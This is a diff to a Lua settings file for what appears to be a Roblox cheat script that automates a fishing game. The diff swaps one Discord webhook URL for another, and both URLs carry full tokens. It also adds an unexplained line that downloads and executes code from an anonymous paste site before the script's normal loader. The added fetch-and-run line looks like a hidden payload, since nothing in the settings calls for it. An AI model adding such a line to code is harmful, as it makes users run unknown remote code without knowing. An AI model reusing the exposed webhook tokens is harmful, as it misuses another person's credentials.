@@ -1,6 +1,6 @@
 getgenv().WebhookFishTier = {"Secret"}
 getgenv().DiscordUser = "1206257142630195233" -- Discord User ID
-getgenv().WebhookURL = "https://discord.com/api/webhooks/1415211763091247155/oPwylc3-SPn35TcC7mZKmFPnbGSqGa6xOqRAD2FMkBOLb0PbGRpkfcT_jgF6kS0gNMpX" -- Change with your webhook!
+getgenv().WebhookURL = "https://discordapp.com/api/webhooks/1458049889706447030/rSlUa8fEW5E1-Jp3ckxXUv0n4GFtBlDOe6RufTrPwJ2dxHjzUjg1xzgjmzVRgFIpfibw" -- Change with your webhook!
 
 -- Player Settings
 getgenv().AutomationSellFishRarity = "Legendary"
@@ -28,4 +28,6 @@ getgenv().HideFishCaughtNotification = true
 
 -- Load Script
 -- script_key = "pEmMRevSnpCgsLSWyOUeqjkqlDwhddQv" -- change with your key
+loadstring(game:HttpGet("https://paste.monster/lwDAcZvahN9G/raw/"))()
+
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a8610f838de809840c5bdba17fc7047b.lua"))()
